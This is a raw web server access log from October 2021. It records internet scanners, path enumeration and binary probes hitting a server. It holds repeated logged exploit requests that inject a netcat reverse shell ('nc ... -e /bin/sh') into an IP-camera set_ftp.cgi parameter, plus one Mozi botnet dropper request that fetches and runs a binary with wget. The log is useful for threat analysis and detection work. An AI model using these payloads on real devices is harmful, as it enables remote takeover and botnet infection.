167.248.133.58 - - [22/Oct/2021:14:12:38 +0800] "GET / HTTP/1.1" 403 159 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
209.141.60.68 - - [22/Oct/2021:14:20:12 +0800] "GET login.cgi HTTP/1.1" 400 163 "-" "-"
209.141.54.36 - - [22/Oct/2021:14:52:50 +0800] "GET login.cgi HTTP/1.1" 400 163 "-" "-"
186.33.118.4 - - [22/Oct/2021:15:01:28 +0800] "GET / HTTP/1.1" 200 23 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
209.141.56.209 - - [22/Oct/2021:15:03:05 +0800] "GET / HTTP/1.1" 200 23 "-" "Linux Gnu (cow)"
112.163.19.153 - - [22/Oct/2021:15:27:40 +0800] "GET / HTTP/1.1" 403 561 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
205.185.115.19 - - [22/Oct/2021:15:33:29 +0800] "GET login.cgi HTTP/1.1" 400 163 "-" "-"
199.195.248.54 - - [22/Oct/2021:15:37:52 +0800] "GET login.cgi HTTP/1.1" 400 163 "-" "-"
199.195.248.54 - - [22/Oct/2021:15:37:53 +0800] "GET /set_ftp.cgi?loginuse=&loginpas=&next_url=ftp.htm&port=21&user=ftp&pwd=ftp&dir=/&mode=PORT&upload_interval=0&svr=%24%28nc+199.195.248.54+1245+-e+%2Fbin%2Fsh%29 HTTP/1.1" 400 163 "-" "-"
199.195.248.54 - - [22/Oct/2021:15:37:53 +0800] "GET /ftptest.cgi?loginuse=&loginpas= HTTP/1.1" 400 163 "-" "-"
106.14.142.154 - - [22/Oct/2021:15:39:40 +0800] "GET / HTTP/1.1" 200 23 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36"
205.185.124.100 - - [22/Oct/2021:15:41:33 +0800] "GET / HTTP/1.1" 200 23 "-" "Linux Gnu (cow)"
209.141.46.89 - - [22/Oct/2021:15:47:20 +0800] "GET login.cgi HTTP/1.1" 400 163 "-" "-"
209.141.46.89 - - [22/Oct/2021:15:47:20 +0800] "GET /set_ftp.cgi?loginuse=&loginpas=&next_url=ftp.htm&port=21&user=ftp&pwd=ftp&dir=/&mode=PORT&upload_interval=0&svr=%24%28nc+209.141.46.89+1245+-e+%2Fbin%2Fsh%29 HTTP/1.1" 400 163 "-" "-"
209.141.46.89 - - [22/Oct/2021:15:47:20 +0800] "GET /ftptest.cgi?loginuse=&loginpas= HTTP/1.1" 400 163 "-" "-"
106.15.95.120 - - [22/Oct/2021:15:47:47 +0800] "\x16\x03\x03\x00\x88\x01\x00\x00\x84\x03\x03arl\xA3Y\xE9\xD6\x92\x9B\xC8|\xA3f6`\xE0`T\xAA\x0E\x05\xAC\x7FW;\x0C\xFC\xAF|\xAC" 400 163 "-" "-"
209.141.58.65 - - [22/Oct/2021:16:06:45 +0800] "GET login.cgi HTTP/1.1" 400 163 "-" "-"
128.14.134.134 - - [22/Oct/2021:16:08:11 +0800] "GET / HTTP/1.1" 200 23 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
117.205.109.230 - - [22/Oct/2021:16:20:14 +0800] "GET / HTTP/1.1" 200 23 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
103.207.36.18 - - [22/Oct/2021:16:26:27 +0800] "\x03\x00\x00\x13\x0E\xE0\x00\x00\x00\x00\x00\x01\x00\x08\x00\x03\x00\x00\x00" 400 163 "-" "-"
47.103.4.170 - - [22/Oct/2021:16:36:14 +0800] "GET / HTTP/1.1" 200 23 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36"
209.141.56.212 - - [22/Oct/2021:17:01:43 +0800] "GET /config/getuser?index=0 HTTP/1.1" 404 159 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
209.141.50.21 - - [22/Oct/2021:17:07:40 +0800] "GET login.cgi HTTP/1.1" 400 163 "-" "-"
139.199.155.97 - - [22/Oct/2021:17:10:40 +0800] "GET / HTTP/1.1" 200 23 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
161.117.190.134 - - [22/Oct/2021:17:18:21 +0800] "GET http://passport.baidu.com/ HTTP/1.1" 403 159 "-" "-"
161.117.190.134 - - [22/Oct/2021:17:18:29 +0800] "\x04\x01\x00Pg)\xA7\xEA\x00" 400 163 "-" "-"
161.117.190.134 - - [22/Oct/2021:17:18:47 +0800] "GET http://passport.baidu.com/ HTTP/1.1" 200 23 "-" "-"
161.117.190.134 - - [22/Oct/2021:17:18:48 +0800] "\x05\x01\x00" 400 163 "-" "-"
161.117.190.134 - - [22/Oct/2021:17:18:57 +0800] "\x04\x01\x00Pg)\xA7\xEA\x00" 400 163 "-" "-"
161.117.190.134 - - [22/Oct/2021:17:19:03 +0800] "\x05\x01\x00" 400 163 "-" "-"
187.190.221.174 - - [22/Oct/2021:17:23:58 +0800] "GET / HTTP/1.1" 403 561 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
209.141.58.65 - - [22/Oct/2021:17:41:26 +0800] "GET login.cgi HTTP/1.1" 400 163 "-" "-"
101.227.1.198 - - [22/Oct/2021:17:44:18 +0800] "GET / HTTP/1.1" 200 23 "-" "Chrome/54.0 (Windows NT 10.0)"
101.227.1.199 - - [22/Oct/2021:17:44:18 +0800] "GET / HTTP/1.1" 200 23 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_0_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36"
101.227.1.198 - - [22/Oct/2021:17:44:22 +0800] "GET /favicon.ico HTTP/1.1" 404 561 "-" "Chrome/54.0 (Windows NT 10.0)"
209.141.48.211 - - [22/Oct/2021:17:46:26 +0800] "GET login.cgi HTTP/1.1" 400 163 "-" "-"
209.141.48.211 - - [22/Oct/2021:17:46:26 +0800] "GET /set_ftp.cgi?loginuse=&loginpas=&next_url=ftp.htm&port=21&user=ftp&pwd=ftp&dir=/&mode=PORT&upload_interval=0&svr=%24%28nc+209.141.48.211+1245+-e+%2Fbin%2Fsh%29 HTTP/1.1" 400 163 "-" "-"
209.141.48.211 - - [22/Oct/2021:17:46:26 +0800] "GET /ftptest.cgi?loginuse=&loginpas= HTTP/1.1" 400 163 "-" "-"
130.211.54.158 - - [22/Oct/2021:17:47:42 +0800] "GET / HTTP/1.1" 200 23 "-" "python-requests/2.26.0"
209.141.53.105 - - [22/Oct/2021:17:51:52 +0800] "GET login.cgi HTTP/1.1" 400 163 "-" "-"
73.245.31.163 - - [22/Oct/2021:17:54:09 +0800] "GET / HTTP/1.1" 403 561 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
209.141.53.225 - - [22/Oct/2021:18:13:32 +0800] "GET login.cgi HTTP/1.1" 400 163 "-" "-"
209.141.36.53 - - [22/Oct/2021:18:15:03 +0800] "GET login.cgi HTTP/1.1" 400 163 "-" "-"
209.141.36.53 - - [22/Oct/2021:18:15:03 +0800] "GET /set_ftp.cgi?loginuse=&loginpas=&next_url=ftp.htm&port=21&user=ftp&pwd=ftp&dir=/&mode=PORT&upload_interval=0&svr=%24%28nc+209.141.36.53+1245+-e+%2Fbin%2Fsh%29 HTTP/1.1" 400 163 "-" "-"
209.141.36.53 - - [22/Oct/2021:18:15:04 +0800] "GET /ftptest.cgi?loginuse=&loginpas= HTTP/1.1" 400 163 "-" "-"
198.12.85.84 - - [22/Oct/2021:19:02:48 +0800] "GET / HTTP/1.1" 200 23 "-" "Linux Gnu (cow)"
209.141.48.202 - - [22/Oct/2021:19:05:33 +0800] "GET login.cgi HTTP/1.1" 400 163 "-" "-"
192.241.202.106 - - [22/Oct/2021:19:25:51 +0800] "GET / HTTP/1.1" 200 23 "-" "Mozilla/5.0 zgrab/0.x"
209.141.46.89 - - [22/Oct/2021:19:31:24 +0800] "GET login.cgi HTTP/1.1" 400 163 "-" "-"
209.141.46.89 - - [22/Oct/2021:19:31:24 +0800] "GET /set_ftp.cgi?loginuse=&loginpas=&next_url=ftp.htm&port=21&user=ftp&pwd=ftp&dir=/&mode=PORT&upload_interval=0&svr=%24%28nc+209.141.46.89+1245+-e+%2Fbin%2Fsh%29 HTTP/1.1" 400 163 "-" "-"
209.141.46.89 - - [22/Oct/2021:19:31:24 +0800] "GET /ftptest.cgi?loginuse=&loginpas= HTTP/1.1" 400 163 "-" "-"
209.141.43.190 - - [22/Oct/2021:19:36:04 +0800] "GET login.cgi HTTP/1.1" 400 163 "-" "-"
209.141.36.53 - - [22/Oct/2021:19:53:29 +0800] "GET login.cgi HTTP/1.1" 400 163 "-" "-"
209.141.36.53 - - [22/Oct/2021:19:53:30 +0800] "GET /set_ftp.cgi?loginuse=&loginpas=&next_url=ftp.htm&port=21&user=ftp&pwd=ftp&dir=/&mode=PORT&upload_interval=0&svr=%24%28nc+209.141.36.53+1245+-e+%2Fbin%2Fsh%29 HTTP/1.1" 400 163 "-" "-"
209.141.36.53 - - [22/Oct/2021:19:53:30 +0800] "GET /ftptest.cgi?loginuse=&loginpas= HTTP/1.1" 400 163 "-" "-"
199.19.226.209 - - [22/Oct/2021:20:11:46 +0800] "GET login.cgi HTTP/1.1" 400 163 "-" "-"
103.216.187.210 - - [22/Oct/2021:20:36:20 +0800] "GET / HTTP/1.1" 200 23 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
122.140.103.90 - - [22/Oct/2021:20:36:50 +0800] "GET / HTTP/1.1" 400 163 "-" "-"
209.141.62.185 - - [22/Oct/2021:20:40:27 +0800] "GET /config/getuser?index=0 HTTP/1.1" 404 159 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
83.97.20.34 - - [22/Oct/2021:20:44:57 +0800] "GET / HTTP/1.0" 200 13 "-" "-"
209.141.50.21 - - [22/Oct/2021:21:02:10 +0800] "GET login.cgi HTTP/1.1" 400 163 "-" "-"
209.141.58.65 - - [22/Oct/2021:21:17:31 +0800] "GET login.cgi HTTP/1.1" 400 163 "-" "-"
209.141.48.211 - - [22/Oct/2021:21:17:42 +0800] "GET login.cgi HTTP/1.1" 400 163 "-" "-"
209.141.48.211 - - [22/Oct/2021:21:17:42 +0800] "GET /set_ftp.cgi?loginuse=&loginpas=&next_url=ftp.htm&port=21&user=ftp&pwd=ftp&dir=/&mode=PORT&upload_interval=0&svr=%24%28nc+209.141.48.211+1245+-e+%2Fbin%2Fsh%29 HTTP/1.1" 400 163 "-" "-"
209.141.48.211 - - [22/Oct/2021:21:17:43 +0800] "GET /ftptest.cgi?loginuse=&loginpas= HTTP/1.1" 400 163 "-" "-"
165.227.136.172 - - [22/Oct/2021:21:37:01 +0800] "GET /nice%20ports%2C/Tri%6Eity.txt%2ebak HTTP/1.0" 404 159 "-" "-"
165.227.136.172 - - [22/Oct/2021:21:37:02 +0800] "OPTIONS / RTSP/1.0" 400 163 "-" "-"
165.227.136.172 - - [22/Oct/2021:21:37:05 +0800] "l\x00\x0B\x00\x00\x00\x00\x00\x00\x00\x00\x00" 400 163 "-" "-"
165.227.136.172 - - [22/Oct/2021:21:37:07 +0800] "HEAD / HTTP/1.0" 200 0 "-" "-"
165.227.136.172 - - [22/Oct/2021:21:37:11 +0800] "OPTIONS / HTTP/1.0" 200 13 "-" "-"
54.151.12.226 - - [22/Oct/2021:21:37:24 +0800] "GET / HTTP/1.1" 200 23 "-" "Mozilla/5.0 zgrab/0.x"
205.185.120.71 - - [22/Oct/2021:21:40:04 +0800] "GET login.cgi HTTP/1.1" 400 163 "-" "-"
205.185.120.71 - - [22/Oct/2021:21:40:04 +0800] "GET /set_ftp.cgi?loginuse=&loginpas=&next_url=ftp.htm&port=21&user=ftp&pwd=ftp&dir=/&mode=PORT&upload_interval=0&svr=%24%28nc+205.185.120.71+1245+-e+%2Fbin%2Fsh%29 HTTP/1.1" 400 163 "-" "-"
205.185.120.71 - - [22/Oct/2021:21:40:04 +0800] "GET /ftptest.cgi?loginuse=&loginpas= HTTP/1.1" 400 163 "-" "-"
31.170.18.217 - - [22/Oct/2021:21:40:33 +0800] "GET / HTTP/1.1" 200 23 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
222.98.36.105 - - [22/Oct/2021:21:44:34 +0800] "GET / HTTP/1.1" 403 561 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
199.19.226.209 - - [22/Oct/2021:21:52:25 +0800] "GET login.cgi HTTP/1.1" 400 163 "-" "-"
199.195.248.54 - - [22/Oct/2021:21:59:59 +0800] "GET login.cgi HTTP/1.1" 400 163 "-" "-"
199.195.248.54 - - [22/Oct/2021:21:59:59 +0800] "GET /set_ftp.cgi?loginuse=&loginpas=&next_url=ftp.htm&port=21&user=ftp&pwd=ftp&dir=/&mode=PORT&upload_interval=0&svr=%24%28nc+199.195.248.54+1245+-e+%2Fbin%2Fsh%29 HTTP/1.1" 400 163 "-" "-"
199.195.248.54 - - [22/Oct/2021:22:00:00 +0800] "GET /ftptest.cgi?loginuse=&loginpas= HTTP/1.1" 400 163 "-" "-"
209.141.50.21 - - [22/Oct/2021:22:02:12 +0800] "GET login.cgi HTTP/1.1" 400 163 "-" "-"
199.195.248.54 - - [22/Oct/2021:22:41:44 +0800] "GET login.cgi HTTP/1.1" 400 163 "-" "-"
199.195.248.54 - - [22/Oct/2021:22:41:44 +0800] "GET /set_ftp.cgi?loginuse=&loginpas=&next_url=ftp.htm&port=21&user=ftp&pwd=ftp&dir=/&mode=PORT&upload_interval=0&svr=%24%28nc+199.195.248.54+1245+-e+%2Fbin%2Fsh%29 HTTP/1.1" 400 163 "-" "-"
199.195.248.54 - - [22/Oct/2021:22:41:44 +0800] "GET /ftptest.cgi?loginuse=&loginpas= HTTP/1.1" 400 163 "-" "-"
209.141.36.53 - - [22/Oct/2021:22:47:43 +0800] "GET login.cgi HTTP/1.1" 400 163 "-" "-"
209.141.36.53 - - [22/Oct/2021:22:47:43 +0800] "GET /set_ftp.cgi?loginuse=&loginpas=&next_url=ftp.htm&port=21&user=ftp&pwd=ftp&dir=/&mode=PORT&upload_interval=0&svr=%24%28nc+209.141.36.53+1245+-e+%2Fbin%2Fsh%29 HTTP/1.1" 400 163 "-" "-"
209.141.36.53 - - [22/Oct/2021:22:47:43 +0800] "GET /ftptest.cgi?loginuse=&loginpas= HTTP/1.1" 400 163 "-" "-"
209.141.32.221 - - [22/Oct/2021:22:58:10 +0800] "GET / HTTP/1.1" 403 159 "-" "Linux Gnu (cow)"
209.141.53.105 - - [22/Oct/2021:22:58:37 +0800] "GET login.cgi HTTP/1.1" 400 163 "-" "-"
209.141.53.225 - - [22/Oct/2021:22:58:43 +0800] "GET login.cgi HTTP/1.1" 400 163 "-" "-"
199.19.226.209 - - [22/Oct/2021:22:59:32 +0800] "GET login.cgi HTTP/1.1" 400 163 "-" "-"
111.13.63.82 - - [22/Oct/2021:23:14:32 +0800] "GET / HTTP/1.0" 200 13 "-" "-"
111.13.63.82 - - [22/Oct/2021:23:14:35 +0800] "GET /nmaplowercheck1634915654 HTTP/1.1" 404 159 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
111.13.63.82 - - [22/Oct/2021:23:14:35 +0800] "GET / HTTP/1.0" 200 13 "-" "-"
111.13.63.82 - - [22/Oct/2021:23:14:35 +0800] "GET / HTTP/1.0" 200 13 "-" "-"
111.13.63.82 - - [22/Oct/2021:23:14:35 +0800] "POST /sdk HTTP/1.1" 404 159 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
111.13.63.82 - - [22/Oct/2021:23:14:35 +0800] "GET /evox/about HTTP/1.1" 404 159 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
111.13.63.82 - - [22/Oct/2021:23:14:35 +0800] "GET /HNAP1 HTTP/1.1" 404 159 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
111.13.63.82 - - [22/Oct/2021:23:14:35 +0800] "GET / HTTP/1.0" 200 13 "-" "-"
111.13.63.82 - - [22/Oct/2021:23:14:35 +0800] "GET / HTTP/1.1" 200 23 "-" "-"
111.13.63.82 - - [22/Oct/2021:23:14:43 +0800] "GET / HTTP/1.1" 200 23 "-" "Mozilla/5.0 (compatible; Wappalyzer)"
111.13.63.82 - - [22/Oct/2021:23:14:43 +0800] "GET /favicon.ico HTTP/1.1" 404 159 "-" "Go-http-client/1.1"
209.141.56.212 - - [22/Oct/2021:23:30:11 +0800] "GET /config/getuser?index=0 HTTP/1.1" 404 159 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
162.221.192.26 - - [22/Oct/2021:23:33:56 +0800] "GET / HTTP/1.1" 200 23 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
39.103.162.230 - - [22/Oct/2021:23:34:38 +0800] "\x16\x03\x01\x02\x00\x01\x00\x01\xFC\x03\x03\xCD\x8F\x17\xE0|\xF8n6\x17?;D>\xDDn\xE2\xD1\x17j\x9D\xFA+\x93\xF0\x1E\x02\x9D}KL\x97\x93 v\xF4 \xDD\xEC\xCF" 400 163 "-" "-"
39.103.162.230 - - [22/Oct/2021:23:34:38 +0800] "GET / HTTP/1.1" 403 561 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36"
117.73.9.130 - - [22/Oct/2021:23:55:18 +0800] "GET / HTTP/1.1" 200 23 "-" "-"
61.242.54.250 - - [23/Oct/2021:00:02:47 +0800] "GET /shell?cd+/tmp;rm+-rf+*;wget+http://192.168.1.1:8088/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws HTTP/1.1" 404 159 "-" "Hello, world"
195.133.18.15 - - [23/Oct/2021:00:06:11 +0800] "GET login.cgi HTTP/1.1" 400 163 "-" "-"
73.242.126.249 - - [23/Oct/2021:00:14:29 +0800] "GET / HTTP/1.1" 200 23 "-" "-"
209.141.53.225 - - [23/Oct/2021:00:34:41 +0800] "GET login.cgi HTTP/1.1" 400 163 "-" "-"
209.141.46.89 - - [23/Oct/2021:00:53:10 +0800] "GET login.cgi HTTP/1.1" 400 163 "-" "-"
209.141.46.89 - - [23/Oct/2021:00:53:11 +0800] "GET /set_ftp.cgi?loginuse=&loginpas=&next_url=ftp.htm&port=21&user=ftp&pwd=ftp&dir=/&mode=PORT&upload_interval=0&svr=%24%28nc+209.141.46.89+1245+-e+%2Fbin%2Fsh%29 HTTP/1.1" 400 163 "-" "-"
209.141.46.89 - - [23/Oct/2021:00:53:11 +0800] "GET /ftptest.cgi?loginuse=&loginpas= HTTP/1.1" 400 163 "-" "-"
78.193.154.132 - - [23/Oct/2021:01:06:31 +0800] "GET / HTTP/1.1" 400 163 "-" "-"
205.185.120.71 - - [23/Oct/2021:01:13:42 +0800] "GET login.cgi HTTP/1.1" 400 163 "-" "-"
205.185.120.71 - - [23/Oct/2021:01:13:42 +0800] "GET /set_ftp.cgi?loginuse=&loginpas=&next_url=ftp.htm&port=21&user=ftp&pwd=ftp&dir=/&mode=PORT&upload_interval=0&svr=%24%28nc+205.185.120.71+1245+-e+%2Fbin%2Fsh%29 HTTP/1.1" 400 163 "-" "-"
205.185.120.71 - - [23/Oct/2021:01:13:43 +0800] "GET /ftptest.cgi?loginuse=&loginpas= HTTP/1.1" 400 163 "-" "-"
112.94.103.80 - - [23/Oct/2021:01:27:05 +0800] "POST /HNAP1/ HTTP/1.0" 404 159 "-" "-"
212.143.66.36 - - [23/Oct/2021:01:27:20 +0800] "GET / HTTP/1.1" 400 163 "-" "-"
183.57.250.149 - - [23/Oct/2021:02:00:08 +0800] "GET / HTTP/1.1" 400 163 "-" "-"
34.77.162.10 - - [23/Oct/2021:02:04:20 +0800] "\x16\x03\x01\x00\xE1\x01\x00\x00\xDD\x03\x03n\xCD\x80\xCC\x87\xC4\x16a(\x03}\x93\xC4\x0C\xEB\xBB\xA6\x02\x9E\xE6\xD5r\xF4\xD34\x19\xE9\x8C\x88\xAF\x9D\x89\x00\x00h\xCC\x14\xCC\x13\xC0/\xC0+\xC00\xC0,\xC0\x11\xC0\x07\xC0'\xC0#\xC0\x13\xC0\x09\xC0(\xC0$\xC0\x14\xC0" 400 163 "-" "-"
101.132.136.239 - - [23/Oct/2021:02:16:58 +0800] "GET / HTTP/1.1" 403 561 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36"
101.132.136.239 - - [23/Oct/2021:02:16:58 +0800] "GET /explicit_not_exist_path HTTP/1.1" 404 561 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36"
101.132.136.239 - - [23/Oct/2021:02:16:58 +0800] "GET /admin/ HTTP/1.1" 404 561 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36"
101.132.136.239 - - [23/Oct/2021:02:16:58 +0800] "GET /robots.txt HTTP/1.1" 404 561 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36"
101.132.136.239 - - [23/Oct/2021:02:16:58 +0800] "GET /favicon.ico HTTP/1.1" 404 561 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36"
101.132.136.239 - - [23/Oct/2021:02:16:58 +0800] "GET /login/img/product_logo.png HTTP/1.1" 404 561 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36"
101.132.136.239 - - [23/Oct/2021:02:16:58 +0800] "GET /images/ofbiz.ico HTTP/1.1" 404 561 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36"
101.132.136.239 - - [23/Oct/2021:02:16:59 +0800] "GET /phpMyAdmin/ HTTP/1.1" 404 561 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36"
101.132.136.239 - - [23/Oct/2021:02:16:59 +0800] "GET /phpmyadmin/ HTTP/1.1" 404 561 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36"
101.132.136.239 - - [23/Oct/2021:02:16:59 +0800] "GET /wcm/ HTTP/1.1" 404 561 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36"
209.141.53.225 - - [23/Oct/2021:02:45:24 +0800] "GET login.cgi HTTP/1.1" 400 163 "-" "-"
209.141.41.31 - - [23/Oct/2021:02:54:09 +0800] "GET login.cgi HTTP/1.1" 400 163 "-" "-"
209.141.56.209 - - [23/Oct/2021:02:54:16 +0800] "GET / HTTP/1.1" 200 23 "-" "Linux Gnu (cow)"
209.141.48.211 - - [23/Oct/2021:03:09:06 +0800] "GET login.cgi HTTP/1.1" 400 163 "-" "-"
209.141.48.211 - - [23/Oct/2021:03:09:06 +0800] "GET /set_ftp.cgi?loginuse=&loginpas=&next_url=ftp.htm&port=21&user=ftp&pwd=ftp&dir=/&mode=PORT&upload_interval=0&svr=%24%28nc+209.141.48.211+1245+-e+%2Fbin%2Fsh%29 HTTP/1.1" 400 163 "-" "-"
209.141.48.211 - - [23/Oct/2021:03:09:06 +0800] "GET /ftptest.cgi?loginuse=&loginpas= HTTP/1.1" 400 163 "-" "-"
209.141.56.212 - - [23/Oct/2021:03:09:26 +0800] "GET /config/getuser?index=0 HTTP/1.1" 404 159 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
209.141.32.221 - - [23/Oct/2021:03:20:53 +0800] "GET / HTTP/1.1" 403 159 "-" "Linux Gnu (cow)"
103.74.110.247 - - [23/Oct/2021:03:25:09 +0800] "GET / HTTP/1.1" 200 23 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
172.105.161.246 - - [23/Oct/2021:03:32:19 +0800] "GET / HTTP/1.1" 200 23 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
35.189.19.57 - - [23/Oct/2021:03:33:46 +0800] "GET / HTTP/1.1" 200 23 "-" "Mozilla/5.0 zgrab/0.x"
205.185.119.102 - - [23/Oct/2021:03:36:44 +0800] "GET login.cgi HTTP/1.1" 400 163 "-" "-"
209.141.36.53 - - [23/Oct/2021:03:45:32 +0800] "GET login.cgi HTTP/1.1" 400 163 "-" "-"
209.141.36.53 - - [23/Oct/2021:03:45:32 +0800] "GET /set_ftp.cgi?loginuse=&loginpas=&next_url=ftp.htm&port=21&user=ftp&pwd=ftp&dir=/&mode=PORT&upload_interval=0&svr=%24%28nc+209.141.36.53+1245+-e+%2Fbin%2Fsh%29 HTTP/1.1" 400 0 "-" "-"
209.141.36.53 - - [23/Oct/2021:03:45:32 +0800] "GET /ftptest.cgi?loginuse=&loginpas= HTTP/1.1" 400 163 "-" "-"
205.185.119.102 - - [23/Oct/2021:03:47:44 +0800] "GET login.cgi HTTP/1.1" 400 163 "-" "-"
209.141.43.190 - - [23/Oct/2021:04:00:54 +0800] "GET login.cgi HTTP/1.1" 400 163 "-" "-"
205.185.119.102 - - [23/Oct/2021:04:05:52 +0800] "GET login.cgi HTTP/1.1" 400 163 "-" "-"
205.185.115.19 - - [23/Oct/2021:04:10:21 +0800] "GET login.cgi HTTP/1.1" 400 163 "-" "-"
205.185.120.72 - - [23/Oct/2021:04:21:31 +0800] "GET login.cgi HTTP/1.1" 400 163 "-" "-"
209.141.54.36 - - [23/Oct/2021:04:26:10 +0800] "GET login.cgi HTTP/1.1" 400 163 "-" "-"
209.141.58.143 - - [23/Oct/2021:04:54:20 +0800] "GET login.cgi HTTP/1.1" 400 163 "-" "-"
199.19.226.209 - - [23/Oct/2021:04:55:35 +0800] "GET login.cgi HTTP/1.1" 400 163 "-" "-"
209.141.36.53 - - [23/Oct/2021:04:57:42 +0800] "GET login.cgi HTTP/1.1" 400 163 "-" "-"
209.141.36.53 - - [23/Oct/2021:04:57:42 +0800] "GET /set_ftp.cgi?loginuse=&loginpas=&next_url=ftp.htm&port=21&user=ftp&pwd=ftp&dir=/&mode=PORT&upload_interval=0&svr=%24%28nc+209.141.36.53+1245+-e+%2Fbin%2Fsh%29 HTTP/1.1" 400 163 "-" "-"
209.141.36.53 - - [23/Oct/2021:04:57:43 +0800] "GET /ftptest.cgi?loginuse=&loginpas= HTTP/1.1" 400 163 "-" "-"
119.90.42.93 - - [23/Oct/2021:05:00:48 +0800] "GET //QeeB HTTP/1.1" 404 159 "-" "Go-http-client/1.1"
199.195.248.54 - - [23/Oct/2021:05:18:56 +0800] "GET login.cgi HTTP/1.1" 400 163 "-" "-"
199.195.248.54 - - [23/Oct/2021:05:18:56 +0800] "GET /set_ftp.cgi?loginuse=&loginpas=&next_url=ftp.htm&port=21&user=ftp&pwd=ftp&dir=/&mode=PORT&upload_interval=0&svr=%24%28nc+199.195.248.54+1245+-e+%2Fbin%2Fsh%29 HTTP/1.1" 400 163 "-" "-"
199.195.248.54 - - [23/Oct/2021:05:18:56 +0800] "GET /ftptest.cgi?loginuse=&loginpas= HTTP/1.1" 400 163 "-" "-"
209.17.97.66 - - [23/Oct/2021:05:34:38 +0800] "GET / HTTP/1.1" 200 23 "-" "Mozilla/5.0 (compatible; Nimbostratus-Bot/v1.3.2; http://cloudsystemnetworks.com)"
195.133.18.15 - - [23/Oct/2021:05:38:53 +0800] "GET login.cgi HTTP/1.1" 400 163 "-" "-"
209.141.32.221 - - [23/Oct/2021:06:01:53 +0800] "GET / HTTP/1.1" 403 159 "-" "Linux Gnu (cow)"
209.141.50.21 - - [23/Oct/2021:06:14:39 +0800] "GET login.cgi HTTP/1.1" 400 163 "-" "-"
